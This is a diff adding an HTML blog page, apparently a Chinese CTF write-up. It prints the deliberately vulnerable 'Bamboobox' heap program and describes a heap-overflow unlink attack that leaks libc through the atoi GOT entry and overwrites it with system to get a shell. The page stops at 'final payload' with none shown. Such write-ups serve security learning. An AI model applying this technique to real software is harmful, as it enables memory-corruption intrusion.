@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="unlink-堆溢出题目  首先，我们先来看源代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091">
+<meta property="og:type" content="article">
+<meta property="og:title" content="unlink-堆溢出题目">
+<meta property="og:url" content="http://example.com/2024/08/08/unlink-%E5%A0%86%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE/index.html">
+<meta property="og:site_name" content="WangYiHao">
+<meta property="og:description" content="unlink-堆溢出题目  首先，我们先来看源代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2024/08/08/unlink-%E5%A0%86%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE/1.png">
+<meta property="og:image" content="http://example.com/2024/08/08/unlink-%E5%A0%86%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE/2.png">
+<meta property="og:image" content="http://example.com/2024/08/08/unlink-%E5%A0%86%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE/3.png">
+<meta property="og:image" content="http://example.com/2024/08/08/unlink-%E5%A0%86%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE/4.png">
+<meta property="og:image" content="http://example.com/2024/08/08/unlink-%E5%A0%86%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE/5.png">
+<meta property="og:image" content="http://example.com/2024/08/08/unlink-%E5%A0%86%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE/6.png">
+<meta property="og:image" content="http://example.com/2024/08/08/unlink-%E5%A0%86%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE/7.png">
+<meta property="og:image" content="http://example.com/2024/08/08/unlink-%E5%A0%86%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE/8.png">
+<meta property="article:published_time" content="2024-08-07T18:24:47.000Z">
+<meta property="article:modified_time" content="2024-08-07T19:36:30.510Z">
+<meta property="article:author" content="SunRT">
+<meta property="article:tag" content="堆溢出">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2024/08/08/unlink-%E5%A0%86%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE/1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>unlink-堆溢出题目</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/about/">Qui som</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/projects_url">Projectes</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2024/08/07/unlink-%E5%A0%86%E6%BA%A2%E5%87%BA/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
+      <span id="i-next" class="info" style="display:none;">Post Següent</span>
+      <span id="i-top" class="info" style="display:none;">Adalt</span>
+      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/08/08/unlink-%E5%A0%86%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/08/08/unlink-%E5%A0%86%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE/&text=unlink-堆溢出题目"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/08/08/unlink-%E5%A0%86%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE/&title=unlink-堆溢出题目"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/08/08/unlink-%E5%A0%86%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE/&is_video=false&description=unlink-堆溢出题目"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=unlink-堆溢出题目&body=Check out this article: http://example.com/2024/08/08/unlink-%E5%A0%86%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/08/08/unlink-%E5%A0%86%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE/&title=unlink-堆溢出题目"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/08/08/unlink-%E5%A0%86%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE/&title=unlink-堆溢出题目"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/08/08/unlink-%E5%A0%86%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE/&title=unlink-堆溢出题目"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/08/08/unlink-%E5%A0%86%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE/&title=unlink-堆溢出题目"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/08/08/unlink-%E5%A0%86%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE/&name=unlink-堆溢出题目&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/08/08/unlink-%E5%A0%86%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE/&t=unlink-堆溢出题目"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">unlink-堆溢出题目</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        unlink-堆溢出题目
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">SunRT</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-08-07T18:24:47.000Z" itemprop="datePublished">2024-08-08</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/" rel="tag">堆溢出</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 align="center">unlink-堆溢出题目</h1>
+
+<p>首先，我们先来看源代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">item</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> size ;</span><br><span class="line">	<span class="type">char</span> *name ;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">item</span> <span class="title">itemlist</span>[100] =</span> &#123;<span class="number">0</span>&#125;; </span><br><span class="line"></span><br><span class="line"><span class="type">int</span> num ;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hello_message</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;There is a box with magic&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;what do you want to do in the box&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">goodbye_message</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;See you next time&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Thanks you&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">box</span>&#123;</span></span><br><span class="line">	<span class="type">void</span> (*hello_message)();</span><br><span class="line">	<span class="type">void</span> (*goodbye_message)();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;----------------------------&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Bamboobox Menu&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;----------------------------&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;1.show the items in the box&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;2.add a new item&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;3.change the item in the box&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;4.remove the item in the box&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;5.exit&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;----------------------------&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Your choice:&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">show_item</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">int</span> i ;</span><br><span class="line">	<span class="keyword">if</span>(!num)&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;No item in the box&quot;</span>);		</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">for</span>(i = <span class="number">0</span> ; i &lt; <span class="number">100</span>; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(itemlist[i].name)&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%d : %s&quot;</span>,i,itemlist[i].name);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">add_item</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> sizebuf[<span class="number">8</span>] ;</span><br><span class="line">	<span class="type">int</span> length ;</span><br><span class="line">	<span class="type">int</span> i ;</span><br><span class="line">	<span class="type">int</span> size ;</span><br><span class="line">	<span class="keyword">if</span>(num &lt; <span class="number">100</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Please enter the length of item name:&quot;</span>);</span><br><span class="line">		read(<span class="number">0</span>,sizebuf,<span class="number">8</span>);</span><br><span class="line">		length = atoi(sizebuf);</span><br><span class="line">		<span class="keyword">if</span>(length == <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;invaild length&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(i = <span class="number">0</span> ; i &lt; <span class="number">100</span> ; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(!itemlist[i].name)&#123;</span><br><span class="line">				itemlist[i].size = length ;</span><br><span class="line">				itemlist[i].name = (<span class="type">char</span>*)<span class="built_in">malloc</span>(length);</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;Please enter the name of item:&quot;</span>);</span><br><span class="line">				size = read(<span class="number">0</span>,itemlist[i].name,length);</span><br><span class="line">				itemlist[i].name[size] = <span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line">				num++;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;the box is full&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">change_item</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> indexbuf[<span class="number">8</span>] ;</span><br><span class="line">	<span class="type">char</span> lengthbuf[<span class="number">8</span>];</span><br><span class="line">	<span class="type">int</span> length ;</span><br><span class="line">	<span class="type">int</span> index ;</span><br><span class="line">	<span class="type">int</span> readsize ;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!num)&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;No item in the box&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Please enter the index of item:&quot;</span>);</span><br><span class="line">		read(<span class="number">0</span>,indexbuf,<span class="number">8</span>);</span><br><span class="line">		index = atoi(indexbuf);</span><br><span class="line">		<span class="keyword">if</span>(itemlist[index].name)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Please enter the length of item name:&quot;</span>);</span><br><span class="line">			read(<span class="number">0</span>,lengthbuf,<span class="number">8</span>);</span><br><span class="line">			length = atoi(lengthbuf);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Please enter the new name of the item:&quot;</span>);</span><br><span class="line">			readsize = read(<span class="number">0</span>,itemlist[index].name,length);</span><br><span class="line">			*(itemlist[index].name + readsize) = <span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;invaild index&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;	</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">remove_item</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">char</span> indexbuf[<span class="number">8</span>] ;</span><br><span class="line">	<span class="type">int</span> index ;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!num)&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;No item in the box&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Please enter the index of item:&quot;</span>);</span><br><span class="line">		read(<span class="number">0</span>,indexbuf,<span class="number">8</span>);</span><br><span class="line">		index = atoi(indexbuf);</span><br><span class="line">		<span class="keyword">if</span>(itemlist[index].name)&#123;</span><br><span class="line">			<span class="built_in">free</span>(itemlist[index].name);</span><br><span class="line">			itemlist[index].name = <span class="number">0</span> ;</span><br><span class="line">			itemlist[index].size = <span class="number">0</span> ;</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;remove successful!!&quot;</span>);</span><br><span class="line">			num-- ;			</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;invaild index&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">magic</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">int</span> fd ;</span><br><span class="line">	<span class="type">char</span> buffer[<span class="number">100</span>];</span><br><span class="line">	fd = open(<span class="string">&quot;/home/bamboobox/flag&quot;</span>,O_RDONLY);</span><br><span class="line">	read(fd,buffer,<span class="keyword">sizeof</span>(buffer));</span><br><span class="line">	close(fd);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,buffer);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="type">char</span> choicebuf[<span class="number">8</span>];</span><br><span class="line">	<span class="type">int</span> choice;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">box</span> *<span class="title">bamboo</span> ;</span></span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">	bamboo = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> box));</span><br><span class="line">	bamboo-&gt;hello_message = hello_message;</span><br><span class="line">	bamboo-&gt;goodbye_message = goodbye_message ;</span><br><span class="line">	bamboo-&gt;hello_message();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		menu();</span><br><span class="line">		read(<span class="number">0</span>,choicebuf,<span class="number">8</span>);</span><br><span class="line">		choice = atoi(choicebuf);</span><br><span class="line">		<span class="keyword">switch</span>(choice)&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">				show_item();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">				add_item();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">				change_item();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">				remove_item();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">				bamboo-&gt;goodbye_message();</span><br><span class="line">				<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="built_in">puts</span>(<span class="string">&quot;invaild choice!!!&quot;</span>);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		</span><br><span class="line">		&#125;	</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>是一个菜单题目，这道题可以看到change_item函数在修改chunk的时候，没有做长度的限制，所以我们可以进行堆溢出，伪造一个chunk然后去unlink，伪造chunk去unlink是因为itemlist里面的name记录的是chunk的数据区的开始：</p>
+<p>我们先申请三个0x80的堆空间：</p>
+<p><img src="/2024/08/08/unlink-%E5%A0%86%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE/1.png" alt="1"></p>
+<p>然后调用change_item函数操作第二块chunk，来溢出到第三块chunk，并且伪造chunk，伪造fd,bk指针：</p>
+<p><img src="/2024/08/08/unlink-%E5%A0%86%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE/2.png" alt="2"></p>
+<p>这样我们就伪造了一块大小为0x80的chunk，并且伪造fd与bk指针，可以让其绕过unlink的检查而顺利unlink：</p>
+<p><img src="/2024/08/08/unlink-%E5%A0%86%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE/3.png" alt="3"></p>
+<p>接下来，我们free掉第三个chunk，由于我们溢出修改了第三个chunk的size的P位，使其由1变为0，所以它将认为上一块的chunk是已经free掉的chunk，所以上一块chunk会执行unlink操作，并且与第三个chunk进行合并操作：</p>
+<p><img src="/2024/08/08/unlink-%E5%A0%86%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE/4.png" alt="4"></p>
+<p>这时候合并的操作也做完了，那么依据unlink的特征，此时itemlist的*name的值也会发生改变：</p>
+<p><img src="/2024/08/08/unlink-%E5%A0%86%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE/5.png" alt="5"></p>
+<p>那么我们就可以操作0x6020c0这一块地方了，我们调用change_item函数，传入参数1,0x80,p64(0)+p64(atoi_got)就可以修改0x6020c0处的数据了，然后我们用show_item函数，就可以得到atoi函数的真实地址，减去该函数的偏移，就可以得到libc地址，继而获取system函数的真实地址：</p>
+<p><img src="/2024/08/08/unlink-%E5%A0%86%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE/6.png" alt="6"></p>
+<p><img src="/2024/08/08/unlink-%E5%A0%86%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE/7.png" alt="7"></p>
+<p>我们继续使用change_item函数，传入参数0,0x8,p64(system_addr)就可以改写atoi的got，下次调用atoi函数的时候，就变成了调用system函数，依据上面的c代码，我们在改写完成后输入sh就可以拿到shell了：</p>
+<p><img src="/2024/08/08/unlink-%E5%A0%86%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE/8.png" alt="8"></p>
+<p>结束，最终payload：</p>
